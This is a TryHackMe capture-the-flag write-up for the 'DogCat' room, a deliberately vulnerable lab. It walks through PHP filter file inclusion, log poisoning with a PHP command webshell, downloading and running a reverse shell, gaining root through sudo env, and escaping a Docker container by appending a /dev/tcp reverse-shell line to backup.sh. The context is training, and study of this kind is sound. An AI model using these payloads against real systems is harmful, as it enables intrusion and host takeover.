---
title: "DogCat"
date: 2023-12-31
layout: "simple"
categories: [TryHackMe]
tags: [Boot2root, privesc, docker escape]
image: https://i.ibb.co/cgYN2Kr/th-3134630742.jpg
---

Hello guys and welcome to yet another Tryhackme writeup. Today we will be handling a medium room which is accessible [here](https://tryhackme.com/room/dogcat).

Well the methodology is quite similar to the Archangel methodology with quite a twist. Let's begin.

## ACCESSING THE WEBPAGE

So I ran an NMAP scan but that was not so productive, so I went directly into the site. 

First we see that the site has two buttons which when we click on dog for example, we get a picture of a dog.
![1](https://i.ibb.co/1K4zM53/dog.png)

Looking closely at our URL we see that it is using the view paramater. Well that is interesting. Let us try and traverse that, using the ```php://filter/convert.base64-encode/resource=./dog/../index```. 

![2](https://i.ibb.co/0mQn4pH/base64filter.png)

We can then see a base64 code on there. Let us decode it.

![3](https://i.ibb.co/JH3p0rm/base64decode.png)

We get to see some php code which when we look closely at the filters we see that ```ext``` can be used to remove the .php which is automatically added at the end of the URL. 

## ACCESS LOGS

Let us use this parameter to view the access logs. 

![4](https://i.ibb.co/gM1tmZP/accesslog.png)

Success! Next we are going to try and do some poisoning on the User-Agent using ```<?php system($_GET['cmd']);?>```. 

If you are not familiar on how to do that check the Archangel writeup.  

Next let us try and run a command using ```&cmd=whoami```

![5](https://i.ibb.co/x12dj5X/whoami.png)

We can see that we are www-data.

## REVERSE SHELL
Now we are going to try and get a reverse shell. We can get one from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Make sure to make the necessary changes to the ip and port.

Next we are gonna run a python server on our machine using ```python -m http.server 80```. Then run ```&cmd= curl -o revshell.php ip/revshell.php```. 

Using wget was not so successfull. We then should check our python server for a 200 status code.
With that done we can run our listener on our machine and run ```&cmd= php revshell.php```, then check back on our machine for a connection.

![6](https://i.ibb.co/t2Fx0MG/revshell.png)

Smooth!

## ROOT
Next we are gonna run ```sudo -l``` which checks the SUID capabilities. 

![7](https://i.ibb.co/LpBsvj2/sudo.png)

Well we see that www-data can run the command as root. So looking at [GTFO bins](https://gtfobins.github.io/) we can see that we can exploit this by using ```sudo env /bin/sh```

And we are root. 
![8](https://i.ibb.co/VV2LmmZ/root.png)

## ESCAPING DOCKER

This was not straight forward since we are supposed to look for the last flag outside the container. But it is not that hard.

As we are moving around we see a file backup.sh which sort of connects to the Host and the container. We can exploit this by running the following command.

```echo "bash -i >& /dev/tcp/ip/port 0>&1" >> backup.sh```

Then start up a listener on your machine and success we are in the host.

![9](https://i.ibb.co/qDSmNyk/container.png)

## RESOURCES 

1. [BASH FOR BEGINNERS](https://www.tldp.org/LDP/Bash-Beginners-Guide/html/)
2. [PHP TRICKS](https://devansh.xyz/ctfs/2021/09/11/php-tricks.html)

Be sure to read the following articles for much better understanding. Happy hacking :)